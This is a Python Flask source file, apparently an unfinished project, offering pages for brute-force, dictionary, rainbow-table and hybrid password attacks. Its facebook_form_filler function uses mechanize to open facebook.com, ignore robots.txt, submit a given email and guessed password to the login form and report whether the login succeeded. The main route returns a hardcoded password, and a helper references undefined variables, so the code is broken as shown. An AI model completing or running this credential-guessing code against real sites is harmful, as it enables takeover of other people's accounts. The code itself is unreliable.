import mechanize
from flask import Flask, render_template, request
app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')
@app.route('/bruteforce')
def bruteforce():
    return render_template('bruteforce.html')
@app.route('/dictionary')
def dictionary():
    return render_template('dictionary.html')
@app.route('/rainbow')
def rainbow():
    return render_template('rainbow.html')
@app.route('/hybrid')
def hybrid():
    return render_template('hybrid.html')
@app.route('/hello')
def hello():
    return 'hello world!'
@app.route('/run_brute_force', methods = ['POST','GET'])
def brute_force_alg():
    #username, website, passwordlength, lengthparam, charset
    passwordlength = request.form['passwordlength']
    username = request.form['accusername']
    lengthparam = request.form['lengthparam']
    charset = request.form['charset']
    website = request.form['website']
    #return "helo world"
    return render_template('result.html', username = username, password = "gobuckeyes")
    # if website == "facebook":
    #     length_parameter_check(username, passwordlength, charset)

    # # elif website == "yahoo":
    #     length_parameter_check(username, passwordlength, charset)

def length_parameter_check(username, passwordlength, charset):
        if lengthparam == "atmost":
            print("1")
        elif lengthparam == "exactly":
            print("2")
        elif lengthparam == "atmost":
            print("3")
        facebook_form_filler(email, "gobuckeyes")
def facebook_form_filler(email, password):
    br = mechanize.Browser()
    #br.set_all_readonly(False)    # allow everything to be written to
    br.set_handle_robots(False)   # no robots
    br.set_handle_refresh(False)  # can sometimes hang without this
    response = br.open("https://www.facebook.com")
    br.form = list(br.forms())[0]
    br.form.set_all_readonly(False) 
    for control in br.form.controls:
        #print(control)
        if control.type == 'password':
            print("found password")

        if control.type == 'email':
            print("found email")
        #print("type={}, name={}".format(control.type, control.name))
    br.form['email'] = email
    br.form['pass'] = password
    result = br.submit(id='u_0_2')
    return result.geturl() == "https://www.facebook.com/"